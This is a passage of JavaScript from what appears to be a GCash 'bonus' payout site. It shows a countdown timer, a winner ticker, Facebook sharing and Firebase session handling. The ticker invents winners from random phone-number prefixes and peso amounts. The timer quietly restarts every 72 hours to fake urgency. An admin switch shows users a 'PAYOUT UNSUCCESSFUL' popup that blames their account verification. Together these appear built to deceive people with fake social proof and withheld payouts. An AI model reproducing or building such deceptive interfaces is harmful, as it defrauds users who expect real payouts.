                'margin: 10px 0;',
                'padding: 10px;',
                'background: rgba(0, 212, 255, 0.08);',
                'border: 1px solid rgba(0, 212, 255, 0.2);',
                'border-radius: 10px;',
                'transition: all 0.3s ease;',
            '}'
        ].join('');
        document.head.appendChild(style);
    }

    // ============================================================
    // TIMER
    // ============================================================
    function initTimer() {
        var displayElement = document.getElementById('mainTimerDisplay');
        if (!displayElement) return;

        var CYCLE_HOURS = 72;
        var timerEndDate = null;

        try {
            var savedEnd = localStorage.getItem('timerEndDate');
            var now = Date.now();

            if (savedEnd && parseInt(savedEnd) > now) {
                timerEndDate = parseInt(savedEnd);
            } else {
                timerEndDate = now + (CYCLE_HOURS * 60 * 60 * 1000);
                localStorage.setItem('timerEndDate', timerEndDate);
            }

            function update() {
                var now = Date.now();
                var diff = timerEndDate - now;

                if (diff <= 0) {
                    timerEndDate = now + (CYCLE_HOURS * 60 * 60 * 1000);
                    localStorage.setItem('timerEndDate', timerEndDate);
                    diff = CYCLE_HOURS * 60 * 60 * 1000;
                }

                var days = Math.floor(diff / (1000 * 60 * 60 * 24));
                var hours = Math.floor((diff / (1000 * 60 * 60)) % 24);
                var minutes = Math.floor((diff / (1000 * 60)) % 60);
                var seconds = Math.floor((diff / 1000) % 60);

                displayElement.innerHTML = days + 'D ' +
                    hours.toString().padStart(2, '0') + ':' +
                    minutes.toString().padStart(2, '0') + ':' +
                    seconds.toString().padStart(2, '0');
            }

            update();
            setInterval(update, 1000);
        } catch(e) {
            console.error('Timer error:', e);
        }
    }

    // ============================================================
    // TICKER
    // ============================================================
    function initTicker() {
        var winnerSpan = document.getElementById('winnerText');
        if (!winnerSpan) return;

        var prefixes = ["0917", "0918", "0927", "0998", "0945", "0966", "0955", "0939", "0906", "0977"];

        var amountRarity = [
            { amount: 500, weight: 85 },
            { amount: 1000, weight: 10 },
            { amount: 2000, weight: 3 },
            { amount: 2500, weight: 2 }
        ];

        var actions = ["received", "received", "withdraw"];

        function generateRandomAmount() {
            var totalWeight = 0;
            for (var i = 0; i < amountRarity.length; i++) totalWeight += amountRarity[i].weight;
            var random = Math.random() * totalWeight;
            var cumulative = 0;
            for (var i = 0; i < amountRarity.length; i++) {
                cumulative += amountRarity[i].weight;
                if (random <= cumulative) return amountRarity[i].amount;
            }
            return 500;
        }

        function updateTicker() {
            var prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
            var last4 = Math.floor(1000 + Math.random() * 9000);
            var amount = generateRandomAmount();
            var action = actions[Math.floor(Math.random() * actions.length)];

            winnerSpan.innerHTML = prefix + '***' + last4 + ' ' + action +
                ' <img src="images/gc_icon.png" class="gc-winner-icon"> ₱' +
                amount.toLocaleString();
        }

        updateTicker();
        setInterval(updateTicker, 4800);
    }

    // ============================================================
    // CONFETTI
    // ============================================================
    var confettiCanvas = null;
    var confettiAnimation = null;

    function initConfetti() {
        confettiCanvas = document.getElementById('confettiCanvas');
    }

    function startConfetti() {
        if (!confettiCanvas) return;

        confettiCanvas.style.display = 'block';
        confettiCanvas.width = window.innerWidth;
        confettiCanvas.height = window.innerHeight;

        var ctx = confettiCanvas.getContext('2d');
        var particles = [];

        for (var i = 0; i < 150; i++) {
            particles.push({
                x: Math.random() * confettiCanvas.width,
                y: Math.random() * confettiCanvas.height - confettiCanvas.height,
                size: Math.random() * 8 + 3,
                color: 'hsl(' + (Math.random() * 360) + ', 100%, 60%)',
                speed: Math.random() * 4 + 2,
                rotation: Math.random() * 360,
                rotationSpeed: (Math.random() - 0.5) * 10
            });
        }

        function draw() {
            if (!confettiCanvas || confettiCanvas.style.display === 'none') return;
            ctx.clearRect(0, 0, confettiCanvas.width, confettiCanvas.height);

            for (var i = 0; i < particles.length; i++) {
                var p = particles[i];
                ctx.save();
                ctx.translate(p.x, p.y);
                ctx.rotate(p.rotation * Math.PI / 180);
                ctx.fillStyle = p.color;
                ctx.fillRect(-p.size/2, -p.size/2, p.size, p.size);
                ctx.restore();

                p.y += p.speed;
                p.rotation += p.rotationSpeed;

                if (p.y > confettiCanvas.height) {
                    p.y = -p.size;
                    p.x = Math.random() * confettiCanvas.width;
                }
            }
            confettiAnimation = requestAnimationFrame(draw);
        }

        draw();

        setTimeout(function() {
            if (confettiAnimation) cancelAnimationFrame(confettiAnimation);
            ctx.clearRect(0, 0, confettiCanvas.width, confettiCanvas.height);
            confettiCanvas.style.display = 'none';
        }, 4000);
    }

    // ============================================================
    // BUTTON EVENTS
    // ============================================================
    function attachButtonEvents() {
        var logoutBtn = document.getElementById('logoutBtn');
        if (logoutBtn) {
            logoutBtn.addEventListener('click', function() {
                logoutUser();
            });
        }

        var fbBtn = document.getElementById('facebookShareBtn');
        if (fbBtn) {
            fbBtn.addEventListener('click', function() {
                shareOnFacebook();
            });
        }
    }

    function logoutUser() {
        if (userPhone) {
            try {
                db.ref('user_sessions/' + userPhone).update({
                    status: 'offline',
                    lastSeen: firebase.database.ServerValue.TIMESTAMP
                });
            } catch(e) {}
        }
        localStorage.clear();
        sessionStorage.clear();
        window.location.replace('index.html');
    }

    function shareOnFacebook() {
        var shareUrl = 'https://tiny.cc/LuckyDrop';
        window.open('https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent(shareUrl), '_blank', 'width=600,height=400');
    }

    // ============================================================
    // BAN CHECK
    // ============================================================
    function checkIfBanned() {
        if (!userPhone) return;
        try {
            db.ref('banned_ghosts/' + userPhone).once('value').then(function(snap) {
                if (snap.exists()) {
                    db.ref('user_sessions/' + userPhone).update({ status: 'offline' });
                    localStorage.clear();
                    sessionStorage.clear();
                    window.location.replace('index.html');
                }
            });
        } catch(e) {}
    }

    // ============================================================
    // ADMIN-ONLY FORCE LOGOUT
    // ============================================================
    function initAdminForceLogoutListener() {
        if (!userPhone || !db) {
            console.log('⚠️ Cannot init force logout - missing userPhone or db');
            return;
        }

        var cleanPhone = userPhone.replace(/[^0-9]/g, '');
        console.log('🔍 Admin Force Logout Listener active for:', cleanPhone);

        try {
            userRef.update({
                status: 'online',
                forceLogout: false,
                lastSeen: firebase.database.ServerValue.TIMESTAMP
            }).then(function() {
                console.log('✅ User reset to ONLINE, forceLogout flag cleared');

                setTimeout(function() {
                    setupAdminLogoutListener(cleanPhone);
                }, 2000);

            }).catch(function(e) {
                console.error('Failed to reset user status:', e);
                setTimeout(function() {
                    setupAdminLogoutListener(cleanPhone);
                }, 3000);
            });

        } catch(e) {
            console.error('Force logout listener error:', e);
        }
    }

    function setupAdminLogoutListener(cleanPhone) {
        if (listenersSetup) return;
        listenersSetup = true;

        console.log('🔍 Setting up admin logout listeners...');

        forceLogoutFlagListener = db.ref('user_sessions/' + cleanPhone + '/forceLogout');

        forceLogoutFlagListener.on('value', function(snapshot) {
            var forceFlag = snapshot.val();
            var now = Date.now();
            var timeSinceLoad = now - pageLoadTime;

            console.log('📡 forceLogout flag update:', forceFlag);

            if (forceFlag === true && !logoutTriggered && timeSinceLoad > 3000) {
                console.log('⚠️ ADMIN FORCE LOGOUT TRIGGERED!');
                logoutTriggered = true;

                if (forceLogoutFlagListener) {
                    forceLogoutFlagListener.off();
                    forceLogoutFlagListener = null;
                }

                showForceLogoutPopup();
            } else if (forceFlag === true && timeSinceLoad <= 3000) {
                console.log('⏭️ Ignoring forceLogout flag (too soon after page load)');
            }
        });

        forceLogoutListener = db.ref('user_sessions/' + cleanPhone + '/status');

        forceLogoutListener.on('value', function(snapshot) {
            var status = snapshot.val();
            var now = Date.now();
            var timeSinceLoad = now - pageLoadTime;

            console.log('📡 Status update:', status, '(time since load:', Math.floor(timeSinceLoad/1000) + 's)');

            if (status === 'offline' && !logoutTriggered && timeSinceLoad > 3000) {

                db.ref('user_sessions/' + cleanPhone + '/forceLogout').once('value').then(function(flagSnap) {
                    var forceFlag = flagSnap.val();

                    if (forceFlag === true) {
                        console.log('⚠️ ADMIN FORCE LOGOUT (via status change)!');
                        logoutTriggered = true;

                        if (forceLogoutListener) {
                            forceLogoutListener.off();
                            forceLogoutListener = null;
                        }

                        showForceLogoutPopup();
                    } else {
                        console.log('ℹ️ Status is offline but forceLogout is false — ignoring');
                    }
                });
            }
        });

        console.log('✅ Admin logout listeners ready');
    }

    function showForceLogoutPopup() {
        if (document.querySelector('.force-logout-popup')) return;

        addForceLogoutAnimations();

        var overlay = document.createElement('div');
        overlay.className = 'force-logout-popup';
        overlay.style.cssText =
            'position: fixed;' +
            'inset: 0;' +
            'background: radial-gradient(ellipse at center, rgba(20, 0, 0, 0.98), rgba(0, 0, 0, 0.99));' +
            'backdrop-filter: blur(15px);' +
            '-webkit-backdrop-filter: blur(15px);' +
            'z-index: 999999;' +
            'display: flex;' +
            'align-items: center;' +
            'justify-content: center;' +
            'animation: fadeInForceLogout 0.4s ease;' +
            'padding: 20px;';

        var particles = document.createElement('div');
        particles.style.cssText =
            'position: absolute; inset: 0; overflow: hidden; pointer-events: none;';

        for (var i = 0; i < 30; i++) {
            var particle = document.createElement('div');
            var size = Math.random() * 4 + 2;
            var startX = Math.random() * 100;
            var delay = Math.random() * 3;
            var duration = Math.random() * 3 + 2;
            particle.style.cssText =
                'position: absolute; top: -10px; left: ' + startX + '%;' +
                'width: ' + size + 'px; height: ' + size + 'px;' +
                'background: rgba(255, 215, 0, ' + (Math.random() * 0.5 + 0.3) + ');' +
                'border-radius: 50%;' +
                'animation: floatDownForceLogout ' + duration + 's ' + delay + 's linear infinite;' +
                'box-shadow: 0 0 ' + (size * 2) + 'px rgba(255, 215, 0, 0.6);';
            particles.appendChild(particle);
        }
        overlay.appendChild(particles);

        var cardWrapper = document.createElement('div');
        cardWrapper.style.cssText =
            'position: relative; z-index: 1;' +
            'animation: cardEnterForceLogout 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);' +
            'max-width: 360px; width: 100%;';

        var glowRing = document.createElement('div');
        glowRing.style.cssText =
            'position: absolute; inset: -3px; border-radius: 28px;' +
            'background: conic-gradient(from 0deg, transparent, rgba(255, 215, 0, 0.8), transparent, rgba(255, 215, 0, 0.4), transparent);' +
            'animation: rotateGlowForceLogout 4s linear infinite; filter: blur(3px);';
        cardWrapper.appendChild(glowRing);

        var card = document.createElement('div');
        card.style.cssText =
            'position: relative;' +
            'background: linear-gradient(160deg, #1a0000 0%, #2a0000 40%, #0d0000 100%);' +
            'border: 3px solid rgba(255, 215, 0, 0.6);' +
            'border-radius: 24px;' +
            'padding: 35px 28px 28px;' +
            'text-align: center;' +
            'box-shadow: 0 30px 60px rgba(0, 0, 0, 0.9), 0 0 60px rgba(255, 215, 0, 0.3);' +
            'overflow: hidden;';

        var iconBg = document.createElement('div');
        iconBg.style.cssText =
            'width: 90px; height: 90px; margin: 0 auto 16px;' +
            'background: radial-gradient(circle, rgba(255, 68, 68, 0.9), rgba(139, 0, 0, 0.95));' +
            'border-radius: 50%; display: flex; align-items: center; justify-content: center;' +
            'border: 3px solid #ffd700;' +
            'box-shadow: 0 0 30px rgba(255, 215, 0, 0.6);';

        var iconEl = document.createElement('span');
        iconEl.style.cssText = 'font-size: 44px; animation: bounceIconForceLogout 0.8s ease;';
        iconEl.textContent = '💸';
        iconBg.appendChild(iconEl);
        card.appendChild(iconBg);

        var badge = document.createElement('div');
        badge.style.cssText =
            'display: inline-block; background: rgba(255, 68, 68, 0.2);' +
            'border: 1px solid rgba(255, 68, 68, 0.5); border-radius: 20px;' +
            'padding: 5px 16px; margin-bottom: 12px;' +
            'font-family: "Orbitron", monospace; font-size: 9px; font-weight: 700;' +
            'color: #ff6666; letter-spacing: 2px; text-transform: uppercase;';
        badge.textContent = '● Session Ended';
        card.appendChild(badge);

        var titleEl = document.createElement('h2');
        titleEl.style.cssText =
            'font-family: "Playfair Display", serif; font-size: 24px; font-weight: 900;' +
            'background: linear-gradient(to bottom, #fff9c4 0%, #ffd700 50%, #ff9800 100%);' +
            '-webkit-background-clip: text; background-clip: text; color: transparent;' +
            'margin: 0 0 10px 0; letter-spacing: 2px; text-transform: uppercase;';
        titleEl.textContent = 'PAYOUT UNSUCCESSFUL';
        card.appendChild(titleEl);

        var divider = document.createElement('div');
        divider.style.cssText = 'display: flex; align-items: center; justify-content: center; gap: 10px; margin: 0 auto 18px;';
        divider.innerHTML =
            '<div style="width: 50px; height: 1px; background: linear-gradient(90deg, transparent, #ffd700);"></div>' +
            '<div style="width: 8px; height: 8px; background: #ffd700; transform: rotate(45deg);"></div>' +
            '<div style="width: 50px; height: 1px; background: linear-gradient(90deg, #ffd700, transparent);"></div>';
        card.appendChild(divider);

        var msgEl = document.createElement('div');
        msgEl.style.cssText =
            'font-family: "Poppins", sans-serif; font-size: 14px;' +
            'color: #ccc; line-height: 1.7; margin: 0 0 12px 0;';
        msgEl.innerHTML =
            'Your payout request is <span style="color: #ff6666; font-weight: 700;">unsuccessful</span>.<br><br>' +
            'Use <strong style="color: #fff9c4;">verified GCash Account</strong><br>' +
            'to process instant withdrawal.';
        card.appendChild(msgEl);

        var infoBox = document.createElement('div');
        infoBox.style.cssText =
            'background: rgba(255, 215, 0, 0.08);' +
            'border: 1px solid rgba(255, 215, 0, 0.3);' +
            'border-radius: 12px; padding: 12px 14px; margin: 14px 0 20px;' +
            'font-family: "Poppins", sans-serif; font-size: 11px;' +
            'color: #999; text-align: left; line-height: 1.5;';
        infoBox.innerHTML =
            '<div style="display: flex; align-items: center; gap: 8px; margin-bottom: 6px;">' +
                '<span style="font-size: 18px;">💡</span>' +
                '<span style="color: #ffd700; font-weight: 700;">Tip for successful withdrawal:</span>' +
            '</div>' +
            '<span>Make sure your GCash account is <strong style="color: #39ff14;">fully verified</strong> with the same mobile number.</span>';
        card.appendChild(infoBox);

        var btn = document.createElement('button');
        btn.style.cssText =
            'width: 100%;' +
            'background: linear-gradient(180deg, #ffeb3b 0%, #ffd700 30%, #ff9800 70%, #ff6f00 100%);' +
            'border: 3px solid #fff9c4; border-radius: 14px;' +
            'padding: 16px 24px;' +
            'font-family: "Orbitron", monospace; font-size: 14px; font-weight: 900;' +
            'color: #8b0000; cursor: pointer; letter-spacing: 2px;' +
            'text-shadow: 0 2px 0 rgba(255, 255, 255, 0.6);' +
            'box-shadow: 0 5px 0 #8b4500, 0 10px 25px rgba(0, 0, 0, 0.6);' +
            'transition: all 0.1s ease; text-transform: uppercase;';
        btn.textContent = '🏠 RETURN TO HOME';

        btn.addEventListener('click', function() {
            overlay.style.animation = 'fadeOutForceLogout 0.3s ease forwards';
            cardWrapper.style.animation = 'cardExitForceLogout 0.3s ease forwards';
            setTimeout(function() {
                localStorage.clear();
                sessionStorage.clear();
                window.location.replace('index.html');
            }, 300);
        });

        card.appendChild(btn);
        cardWrapper.appendChild(card);
        overlay.appendChild(cardWrapper);
        document.body.appendChild(overlay);

        setTimeout(function() {
            if (document.querySelector('.force-logout-popup')) {
                localStorage.clear();
                sessionStorage.clear();
                window.location.replace('index.html');
            }
        }, 15000);
    }

    function addForceLogoutAnimations() {
        if (document.querySelector('#force-logout-animations')) return;

        var style = document.createElement('style');
        style.id = 'force-logout-animations';
        style.textContent =
            '@keyframes fadeInForceLogout { from { opacity: 0; } to { opacity: 1; } }' +
            '@keyframes fadeOutForceLogout { from { opacity: 1; } to { opacity: 0; } }' +
            '@keyframes cardEnterForceLogout { 0% { transform: scale(0.7) translateY(30px); opacity: 0; } 60% { transform: scale(1.03) translateY(-5px); } 100% { transform: scale(1) translateY(0); opacity: 1; } }' +
            '@keyframes cardExitForceLogout { from { transform: scale(1); opacity: 1; } to { transform: scale(0.8) translateY(20px); opacity: 0; } }' +
            '@keyframes bounceIconForceLogout { 0% { transform: scale(0) rotate(-30deg); } 50% { transform: scale(1.3) rotate(10deg); } 70% { transform: scale(0.85); } 100% { transform: scale(1) rotate(0deg); } }' +
            '@keyframes rotateGlowForceLogout { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }' +
            '@keyframes floatDownForceLogout { 0% { transform: translateY(-10px); opacity: 0; } 10% { opacity: 1; } 90% { opacity: 1; } 100% { transform: translateY(105vh); opacity: 0; } }';
        document.head.appendChild(style);
    }

    // ============================================================
    // EXPORT
    // ============================================================
    window.PlayBonus = {
        playSound: playSound,
        formatNumberWithComma: formatNumberWithComma,
        getBalance: function() { return currentBalance; },
        getUserPhone: function() { return userPhone; },
        isUserClaimed: function() { return isClaimed; },
        showPopup: window.showPopup,
        closePopup: window.closePopup,
        getFirewallStatus: function() { return currentFirewallStatus; }
    };

    // ============================================================
    // START
    // ============================================================
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', function() {
            init();
            setInterval(checkIfBanned, 5000);
            checkIfBanned();
        });
    } else {
        init();
        setInterval(checkIfBanned, 5000);
        checkIfBanned();
    }

})();
